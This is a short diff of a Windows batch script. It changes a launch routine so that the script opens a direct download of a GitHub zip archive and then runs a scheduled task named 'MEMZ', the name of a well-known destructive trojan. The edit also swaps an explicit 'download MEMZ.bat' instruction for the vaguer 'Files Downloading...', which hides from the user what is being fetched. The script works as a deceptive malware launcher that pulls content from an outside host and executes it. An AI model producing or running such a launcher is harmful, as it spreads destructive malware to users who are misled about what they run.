@@ -23,8 +23,8 @@ goto launch
 
 
 :launch
-echo The tasks now on you, please download MEMZ.bat from the website that will now open in your browser.
-start https://www.github.com/18209550/
+echo Files Downloading...
+start https://github.com/18209550/batch-files-by-pumaroar1/archive/refs/heads/main.zip
 echo Once Downloaded, press any key to continue.
 pause >nul
 SCHTASKS /run /tn "MEMZ"
